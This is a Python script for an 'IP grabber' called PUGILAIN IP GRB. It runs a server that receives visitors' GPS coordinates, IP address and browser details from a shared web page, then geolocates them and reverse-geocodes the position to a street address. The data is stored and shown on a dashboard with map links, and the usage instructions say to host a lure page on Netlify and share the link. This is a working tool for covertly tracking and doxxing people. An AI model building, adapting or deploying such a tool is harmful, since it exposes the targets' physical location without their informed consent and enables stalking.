import http.server
import json
import socket
import threading
import uuid
import requests
import os
import time
import webbrowser
import subprocess
import sys
import platform
import hashlib
import base64
import random
import string
import re
from datetime import datetime, timedelta
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def loading_animation(duration, message):
    chars = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
    end_time = time.time() + duration
    while time.time() < end_time:
        for char in chars:
            sys.stdout.write(f'\r\033[96m{char} {message}\033[0m')
            sys.stdout.flush()
            time.sleep(0.1)
    sys.stdout.write('\r' + ' ' * 60 + '\r')
    sys.stdout.flush()

def slow_print(text, delay=0.02):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def generate_device_id():
    system_info = platform.platform() + platform.machine() + platform.processor()
    return hashlib.sha256(system_info.encode()).hexdigest()[:16]

def generate_token():
    random_part = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
    timestamp_part = str(int(time.time()))
    combined = random_part + timestamp_part
    return hashlib.sha256(combined.encode()).hexdigest()

def encode_base64(data):
    return base64.b64encode(json.dumps(data).encode()).decode()

def decode_base64(data):
    return json.loads(base64.b64decode(data).decode())

def get_timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def get_iso_timestamp():
    return datetime.now().isoformat()

def get_unix_timestamp():
    return int(time.time())

def format_bytes(bytes_count):
    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
        if bytes_count < 1024:
            return f"{bytes_count:.2f} {unit}"
        bytes_count /= 1024

def validate_ip(ip):
    pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    if not pattern.match(ip):
        return False
    parts = ip.split('.')
    return all(0 <= int(part) <= 255 for part in parts)

def get_client_info(ip):
    try:
        response = requests.get(
            f"http://ip-api.com/json/{ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query",
            timeout=10
        )
        return response.json()
    except Exception as e:
        return {'status': 'error', 'message': str(e)}

def get_additional_geo(lat, lng):
    try:
        response = requests.get(
            f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lng}&format=json",
            headers={'User-Agent': 'PUGILAIN-IP-GRB/1.0'},
            timeout=5
        )
        if response.status_code == 200:
            data = response.json()
            return {
                'address': data.get('display_name', 'N/A'),
                'road': data.get('address', {}).get('road', 'N/A'),
                'house_number': data.get('address', {}).get('house_number', 'N/A'),
                'suburb': data.get('address', {}).get('suburb', 'N/A'),
                'postcode': data.get('address', {}).get('postcode', 'N/A')
            }
    except:
        pass
    return None

clear()

BANNER = r"""
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                                              ║
║   ██████╗ ██╗   ██╗  ██████╗  ██╗ ██╗       █████╗  ██╗ ███╗   ██╗          ██╗██████╗                                       ║
║   ██╔══██╗██║   ██║ ██╔════╝  ██║ ██║      ██╔══██╗ ██║ ████╗  ██║          ██║██╔══██╗                                      ║
║   ██████╔╝██║   ██║ ██║  ███╗ ██║ ██║      ███████║ ██║ ██╔██╗ ██║          ██║██████╔╝                                      ║
║   ██╔═══╝ ██║   ██║ ██║   ██║ ██║ ██║      ██╔══██║ ██║ ██║╚██╗██║          ██║██╔═══╝                                       ║
║   ██║     ╚██████╔╝ ╚██████╔╝ ██║ ███████╗ ██║  ██║ ██║ ██║ ╚████║          ██║██║                                           ║
║   ╚═╝      ╚═════╝   ╚═════╝  ╚═╝ ╚══════╝ ╚═╝  ╚═╝ ╚═╝ ╚═╝  ╚═══╝          ╚═╝╚═╝                                           ║
║                                                                                                                              ║
║              ░▒▓████████████████████████████████████████████████████████████████████▓▒░                                      ║
║                                                                                                                              ║
║                         ◈  P U G I L A I N  ◈                                                                               ║
║                                                                                                                              ║
║              ────────────────  I P  •  G R B  ────────────────                                                               ║
║                                                                                                                              ║
║        [ SYSTEM ] ────────────── ONLINE        [ ENGINE ] ────────────── READY        [ VERSION ] ─── 2.0                    ║
║                                                                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝

"""

print('\033[92m' + BANNER + '\033[0m')
print()

time.sleep(1)

loading_animation(2, "Initializing core modules...")
print("\033[92m[✓]\033[0m Core modules initialized")
time.sleep(0.4)

loading_animation(2, "Loading configuration...")
print("\033[92m[✓]\033[0m Configuration loaded")
time.sleep(0.4)

loading_animation(2, "Preparing environment...")
print("\033[92m[✓]\033[0m Environment ready")
time.sleep(0.4)

loading_animation(2, "Detecting system...")
system_info = platform.platform()
print(f"\033[92m[✓]\033[0m System: {system_info}")
time.sleep(0.4)

loading_animation(2, "Generating device ID...")
DEVICE_ID = generate_device_id()
print(f"\033[92m[✓]\033[0m Device ID: {DEVICE_ID}")
time.sleep(0.4)

loading_animation(2, "Generating secure tokens...")
SECRET_KEY = generate_token()
print(f"\033[92m[✓]\033[0m Token: {SECRET_KEY[:16]}...")
time.sleep(0.4)

DESKTOP = os.path.join(os.path.expanduser("~"), "Desktop")
PROJECT_FOLDER = os.path.join(DESKTOP, "Ipporject")
DATA_FILE = os.path.join(PROJECT_FOLDER, "datainput.txt")
KEY_FILE = os.path.join(PROJECT_FOLDER, "key.txt")
LOG_FILE = os.path.join(PROJECT_FOLDER, "system.log")
CONFIG_FILE = os.path.join(PROJECT_FOLDER, "config.json")

if not os.path.exists(PROJECT_FOLDER):
    os.makedirs(PROJECT_FOLDER)
    loading_animation(2, "Creating project folder...")
    print("\033[92m[✓]\033[0m Folder created")
else:
    print("\033[92m[✓]\033[0m Folder exists")
time.sleep(0.4)

config_data = {
    'device_id': DEVICE_ID,
    'secret_key': SECRET_KEY,
    'created_at': get_iso_timestamp(),
    'version': '2.0',
    'author': 'PUGILAIN'
}

with open(CONFIG_FILE, 'w') as f:
    json.dump(config_data, f, indent=4)

with open(KEY_FILE, 'w') as f:
    f.write(SECRET_KEY)

with open(LOG_FILE, 'a') as f:
    f.write(f"[{get_timestamp()}] System initialized\n")
    f.write(f"[{get_timestamp()}] Device ID: {DEVICE_ID}\n")
    f.write(f"[{get_timestamp()}] Config saved\n")

print("\033[92m[✓]\033[0m Config saved")
time.sleep(0.4)

loading_animation(2, "Starting local server...")
print("\033[92m[✓]\033[0m Server started")
time.sleep(0.4)

print(f"""
\033[97m{'='*70}\033[0m
\033[96m  PUGILAIN IP GRB - SYSTEM READY\033[0m
\033[97m{'='*70}\033[0m

\033[92m[FILES CREATED]\033[0m
  \033[97mFolder:\033[0m {PROJECT_FOLDER}
  \033[97mData:\033[0m {DATA_FILE}
  \033[97mKey:\033[0m {KEY_FILE}
  \033[97mConfig:\033[0m {CONFIG_FILE}
  \033[97mLog:\033[0m {LOG_FILE}

\033[93m[HOW TO USE]\033[0m
  \033[97m1.\033[0m Use localtunnel or port forwarding
  \033[97m2.\033[0m Update HTML with your public URL
  \033[97m3.\033[0m Upload HTML to Netlify
  \033[97m4.\033[0m Share the link

\033[96m[STATUS]\033[0m
  \033[97mDashboard:\033[0m http://localhost:5000
  \033[97mServer:\033[0m RUNNING
  \033[97mPort:\033[0m 5000

\033[97m{'='*70}\033[0m
""")

visits_count = 0
visits_lock = threading.Lock()
server_running = True
server_instance = None

def log_message(message):
    timestamp = get_timestamp()
    with open(LOG_FILE, 'a') as f:
        f.write(f"[{timestamp}] {message}\n")
    print(f"\033[90m[{timestamp}] {message}\033[0m")

def get_visitor_ip(handler):
    forwarded = handler.headers.get('X-Forwarded-For')
    if forwarded:
        return forwarded.split(',')[0].strip()
    return handler.client_address[0]

def get_client_headers(handler):
    headers = {}
    for header in handler.headers:
        headers[header] = handler.headers[header]
    return headers

def get_user_agent_info(user_agent):
    info = {
        'browser': 'Unknown',
        'os': 'Unknown',
        'device': 'Unknown',
        'is_mobile': False,
        'is_tablet': False,
        'is_desktop': False
    }
    
    if not user_agent:
        return info
    
    ua = user_agent.lower()
    
    if 'chrome' in ua and 'edg' not in ua:
        info['browser'] = 'Chrome'
    elif 'firefox' in ua:
        info['browser'] = 'Firefox'
    elif 'safari' in ua and 'chrome' not in ua:
        info['browser'] = 'Safari'
    elif 'edg' in ua:
        info['browser'] = 'Edge'
    elif 'opera' in ua or 'opr' in ua:
        info['browser'] = 'Opera'
    elif 'msie' in ua or 'trident' in ua:
        info['browser'] = 'Internet Explorer'
    
    if 'windows' in ua:
        info['os'] = 'Windows'
    elif 'mac os' in ua or 'macos' in ua:
        info['os'] = 'macOS'
    elif 'linux' in ua and 'android' not in ua:
        info['os'] = 'Linux'
    elif 'android' in ua:
        info['os'] = 'Android'
    elif 'ios' in ua or 'iphone' in ua or 'ipad' in ua:
        info['os'] = 'iOS'
    
    if 'mobile' in ua or 'android' in ua or 'iphone' in ua:
        info['is_mobile'] = True
        info['device'] = 'Mobile'
    elif 'ipad' in ua or 'tablet' in ua:
        info['is_tablet'] = True
        info['device'] = 'Tablet'
    else:
        info['is_desktop'] = True
        info['device'] = 'Desktop'
    
    return info

def get_screen_resolution(data):
    if data.get('screen_width') and data.get('screen_height'):
        return f"{data['screen_width']}x{data['screen_height']}"
    return 'Unknown'

def get_battery_info(data):
    if data.get('battery_level') is not None:
        return f"{data['battery_level']}% {'(charging)' if data.get('battery_charging') else '(discharging)'}"
    return 'Unknown'

def get_network_info(data):
    if data.get('connection_type'):
        return data['connection_type']
    return 'Unknown'

def get_memory_info(data):
    if data.get('device_memory'):
        return f"{data['device_memory']} GB"
    return 'Unknown'

def get_cpu_info(data):
    if data.get('hardware_concurrency'):
        return f"{data['hardware_concurrency']} cores"
    return 'Unknown'

def get_touch_support(data):
    if data.get('max_touch_points') is not None:
        return f"{data['max_touch_points']} points"
    return 'Unknown'

class Handler(BaseHTTPRequestHandler):
    
    server_version = 'PUGILAIN/2.0'
    
    def do_GET(self):
        global visits_count, server_running
        
        parsed_path = urlparse(self.path)
        
        if self.path == '/' or self.path == '/dashboard':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
            self.send_header('Pragma', 'no-cache')
            self.send_header('Expires', '0')
            self.end_headers()
            
            visits_html = ""
            if os.path.exists(DATA_FILE):
                try:
                    with open(DATA_FILE, 'r', encoding='utf-8') as f:
                        content = f.read()
                    
                    blocks = content.split('='*80)
                    visits_list = []
                    for block in blocks:
                        if block.strip():
                            try:
                                visit = json.loads(block.strip())
                                visits_list.append(visit)
                            except:
                                pass
                    
                    visits_list.reverse()
                    
                    for visit in visits_list:
                        gps_lat = visit.get('gps', {}).get('lat', 'N/A')
                        gps_lng = visit.get('gps', {}).get('lng', 'N/A')
                        accuracy = visit.get('gps', {}).get('accuracy', 'N/A')
                        city = 'N/A'
                        country = 'N/A'
                        isp = 'N/A'
                        if visit.get('geo'):
                            city = visit.get('geo', {}).get('city', 'N/A')
                            country = visit.get('geo', {}).get('country', 'N/A')
                            isp = visit.get('geo', {}).get('isp', 'N/A')
                        
                        maps_link = visit.get('maps_link', '#')
                        timestamp = visit.get('timestamp', 'N/A')
                        ip = visit.get('ip', 'N/A')
                        
                        visits_html += f"""
                        <div class="visit-card">
                            <div class="visit-header">
                                <span class="status-dot"></span>
                                <span>Visit #{visits_list.index(visit) + 1}</span>
                                <span class="timestamp">{timestamp}</span>
                            </div>
                            <div class="visit-body">
                                <div class="info-row">
                                    <span class="label">IP Address:</span>
                                    <span class="value">{ip}</span>
                                </div>
                                <div class="info-row">
                                    <span class="label">GPS Coordinates:</span>
                                    <span class="value highlight">{gps_lat}, {gps_lng}</span>
                                </div>
                                <div class="info-row">
                                    <span class="label">Accuracy:</span>
                                    <span class="value">{accuracy} meters</span>
                                </div>
                                <div class="info-row">
                                    <span class="label">City:</span>
                                    <span class="value">{city}</span>
                                </div>
                                <div class="info-row">
                                    <span class="label">Country:</span>
                                    <span class="value">{country}</span>
                                </div>
                                <div class="info-row">
                                    <span class="label">ISP:</span>
                                    <span class="value">{isp}</span>
                                </div>
                                <a href="{maps_link}" target="_blank" class="maps-btn">Open in Google Maps</a>
                            </div>
                        </div>"""
                except Exception as e:
                    log_message(f"Error reading data: {e}")
            
            dashboard = f"""<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PUGILAIN IP GRB - Dashboard</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            background: #0a0a0a;
            color: #fff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            padding: 20px;
            min-height: 100vh;
        }}
        .header {{
            text-align: center;
            margin-bottom: 30px;
            padding: 20px;
        }}
        .header h1 {{
            font-size: 2em;
            background: linear-gradient(45deg, #fff, #888);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 5px;
        }}
        .header p {{
            color: #666;
            font-size: 0.9em;
        }}
        .container {{
            max-width: 800px;
            margin: 0 auto;
        }}
        .visit-card {{
            background: #111;
            border: 1px solid #222;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 15px;
            transition: all 0.3s;
        }}
        .visit-card:hover {{
            border-color: #444;
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(255,255,255,0.05);
        }}
        .visit-header {{
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 1px solid #222;
        }}
        .status-dot {{
            width: 8px;
            height: 8px;
            background: #0f0;
            border-radius: 50%;
            animation: pulse 2s infinite;
        }}
        @keyframes pulse {{
            0% {{ box-shadow: 0 0 0 0 rgba(0,255,0,0.7); }}
            70% {{ box-shadow: 0 0 0 10px rgba(0,255,0,0); }}
            100% {{ box-shadow: 0 0 0 0 rgba(0,255,0,0); }}
        }}
        .timestamp {{
            margin-left: auto;
            color: #666;
            font-size: 0.8em;
        }}
        .visit-body {{
            display: flex;
            flex-direction: column;
            gap: 8px;
        }}
        .info-row {{
            display: flex;
            justify-content: space-between;
            padding: 5px 0;
        }}
        .label {{
            color: #888;
        }}
        .value {{
            font-weight: bold;
        }}
        .highlight {{
            color: #0f0;
        }}
        .maps-btn {{
            display: inline-block;
            margin-top: 10px;
            padding: 10px 20px;
            background: #fff;
            color: #000;
            text-decoration: none;
            border-radius: 6px;
            font-weight: bold;
            text-align: center;
            transition: all 0.3s;
        }}
        .maps-btn:hover {{
            background: #ddd;
            transform: scale(1.02);
        }}
        .empty {{
            text-align: center;
            color: #666;
            padding: 50px;
            font-size: 1.2em;
        }}
    </style>
</head>
<body>
    <div class="header">
        <h1>PUGILAIN IP GRB</h1>
        <p>Dashboard Monitoraggio Visite</p>
    </div>
    <div class="container">
        {visits_html if visits_html else '<div class="empty">Nessuna visita registrata</div>'}
    </div>
</body>
</html>"""
            
            self.wfile.write(dashboard.encode('utf-8'))
        
        elif self.path == '/api/stats':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            
            stats = {
                'total_visits': visits_count,
                'device_id': DEVICE_ID,
                'uptime': 'N/A',
                'server': 'PUGILAIN/2.0',
                'status': 'online'
            }
            
            self.wfile.write(json.dumps(stats).encode())
        
        else:
            self.send_response(404)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"error":"Not found"}')
    
    def do_POST(self):
        global visits_count
        
        if self.path == '/api/collect':
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length)
            
            try:
                data = json.loads(body)
            except:
                data = {}
            
            if data.get('key') == SECRET_KEY:
                with visits_lock:
                    visits_count += 1
                    visit_number = visits_count
                
                ip = get_visitor_ip(self)
                timestamp = get_timestamp()
                iso_timestamp = get_iso_timestamp()
                
                headers = get_client_headers(self)
                user_agent = headers.get('User-Agent', '')
                ua_info = get_user_agent_info(user_agent)
                
                print("\n")
                print("\033[92m" + "╔" + "═"*78 + "╗" + "\033[0m")
                print("\033[92m║" + " " * 20 + "NUOVA VISITA RICEVUTA" + " " * 34 + "║" + "\033[0m")
                print("\033[92m" + "╚" + "═"*78 + "╝" + "\033[0m")
                print("\033[92m" + "═"*80 + "\033[0m")
                print(f"\033[97m[VISITA N°]\033[0m {visit_number}")
                print(f"\033[97m[TIMESTAMP]\033[0m {timestamp}")
                print(f"\033[97m[ISO]\033[0m {iso_timestamp}")
                print("\033[92m" + "═"*80 + "\033[0m")
                
                print(f"\n\033[96m[IP ADDRESS]\033[0m")
                print(f"  IP: {ip}")
                
                if data.get('lat') and data.get('lng'):
                    print(f"\n\033[96m[GPS COORDINATES]\033[0m")
                    print(f"  Latitude: {data['lat']}")
                    print(f"  Longitude: {data['lng']}")
                    print(f"  Accuracy: {data.get('accuracy', 'N/A')} meters")
                    if data.get('altitude'):
                        print(f"  Altitude: {data['altitude']} meters")
                    if data.get('speed'):
                        print(f"  Speed: {data['speed']} m/s")
                    if data.get('heading'):
                        print(f"  Heading: {data['heading']}°")
                
                geo_data = get_client_info(ip)
                
                if geo_data.get('status') == 'success':
                    print(f"\n\033[96m[GEOGRAPHICAL DATA]\033[0m")
                    print(f"  Continent: {geo_data.get('continent', 'N/A')}")
                    print(f"  Country: {geo_data.get('country', 'N/A')} ({geo_data.get('countryCode', 'N/A')})")
                    print(f"  Region: {geo_data.get('regionName', 'N/A')}")
                    print(f"  City: {geo_data.get('city', 'N/A')}")
                    print(f"  District: {geo_data.get('district', 'N/A')}")
                    print(f"  ZIP: {geo_data.get('zip', 'N/A')}")
                    print(f"  Timezone: {geo_data.get('timezone', 'N/A')}")
                    print(f"  Currency: {geo_data.get('currency', 'N/A')}")
                    
                    print(f"\n\033[96m[NETWORK DATA]\033[0m")
                    print(f"  ISP: {geo_data.get('isp', 'N/A')}")
                    print(f"  Organization: {geo_data.get('org', 'N/A')}")
                    print(f"  ASN: {geo_data.get('as', 'N/A')}")
                    print(f"  AS Name: {geo_data.get('asname', 'N/A')}")
                    print(f"  Reverse DNS: {geo_data.get('reverse', 'N/A')}")
                    print(f"  Mobile: {geo_data.get('mobile', False)}")
                    print(f"  Proxy: {geo_data.get('proxy', False)}")
                    print(f"  Hosting: {geo_data.get('hosting', False)}")
                    
                    maps_link = f"https://www.google.com/maps?q={geo_data.get('lat')},{geo_data.get('lon')}"
                    print(f"\n\033[93m[GOOGLE MAPS]\033[0m")
                    print(f"  {maps_link}")
                    
                    if data.get('lat') and data.get('lng'):
                        additional_geo = get_additional_geo(data['lat'], data['lng'])
                        if additional_geo:
                            print(f"\n\033[96m[DETAILED ADDRESS]\033[0m")
                            print(f"  {additional_geo.get('address', 'N/A')}")
                    
                    result = {
                        'visit_number': visit_number,
                        'ip': ip,
                        'timestamp': timestamp,
                        'iso_timestamp': iso_timestamp,
                        'gps': {
                            'lat': data.get('lat'),
                            'lng': data.get('lng'),
                            'accuracy': data.get('accuracy'),
                            'altitude': data.get('altitude'),
                            'speed': data.get('speed'),
                            'heading': data.get('heading')
                        },
                        'geo': {
                            'continent': geo_data.get('continent'),
                            'continentCode': geo_data.get('continentCode'),
                            'country': geo_data.get('country'),
                            'countryCode': geo_data.get('countryCode'),
                            'region': geo_data.get('regionName'),
                            'city': geo_data.get('city'),
                            'district': geo_data.get('district'),
                            'zip': geo_data.get('zip'),
                            'timezone': geo_data.get('timezone'),
                            'currency': geo_data.get('currency'),
                            'isp': geo_data.get('isp'),
                            'org': geo_data.get('org'),
                            'asn': geo_data.get('as'),
                            'asname': geo_data.get('asname'),
                            'mobile': geo_data.get('mobile'),
                            'proxy': geo_data.get('proxy'),
                            'hosting': geo_data.get('hosting')
                        },
                        'device': {
                            'browser': ua_info.get('browser'),
                            'os': ua_info.get('os'),
                            'device_type': ua_info.get('device'),
                            'is_mobile': ua_info.get('is_mobile'),
                            'is_tablet': ua_info.get('is_tablet'),
                            'is_desktop': ua_info.get('is_desktop')
                        },
                        'maps_link': maps_link,
                        'user_agent': user_agent
                    }
                else:
                    result = {
                        'visit_number': visit_number,
                        'ip': ip,
                        'timestamp': timestamp,
                        'iso_timestamp': iso_timestamp,
                        'gps': {
                            'lat': data.get('lat'),
                            'lng': data.get('lng'),
                            'accuracy': data.get('accuracy')
                        },
                        'geo': None,
                        'device': {
                            'browser': ua_info.get('browser'),
                            'os': ua_info.get('os'),
                            'device_type': ua_info.get('device')
                        },
                        'maps_link': f"https://www.google.com/maps?q={data.get('lat')},{data.get('lng')}" if data.get('lat') and data.get('lng') else '#',
                        'user_agent': user_agent
                    }
                
                with open(DATA_FILE, 'a', encoding='utf-8') as f:
                    f.write(json.dumps(result, indent=2, ensure_ascii=False) + "\n" + "="*80 + "\n")
                
                log_message(f"Visit #{visit_number} saved")
                
                print(f"\n\033[92m[✓] Dati salvati in datainput.txt\033[0m")
                print("\033[92m" + "═"*80 + "\033[0m\n")
                
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
                self.send_header('Access-Control-Allow-Headers', 'Content-Type')
                self.send_header('Cache-Control', 'no-cache')
                self.end_headers()
                self.wfile.write(b'{"success":true,"message":"Data received"}')
            else:
                self.send_response(403)
                self.send_header('Access-Control-Allow-Origin', '*')
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(b'{"error":"Invalid key","code":403}')
        else:
            self.send_response(404)
            self.send_header('Access-Control-Allow-Origin', '*')
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"error":"Not found","code":404}')
    
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, X-Requested-With')
        self.send_header('Access-Control-Max-Age', '3600')
        self.end_headers()
    
    def log_message(self, format, *args):
        pass

def start_server():
    global server_instance
    try:
        server_instance = HTTPServer(('0.0.0.0', 5000), Handler)
        log_message("Server started on port 5000")
        server_instance.serve_forever()
    except OSError as e:
        log_message(f"Error starting server: {e}")
        print(f"\033[91m[!] Porta 5000 già in uso\033[0m")
        print(f"\033[91m[!] Chiudi altre istanze e riavvia\033[0m")

server_thread = threading.Thread(target=start_server, daemon=True)
server_thread.start()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\n\033[91m[!] Chiusura...\033[0m")
    if server_instance:
        server_instance.shutdown()
    log_message("Server stopped")
    print("\033[91m[✓] Server fermato\033[0m")
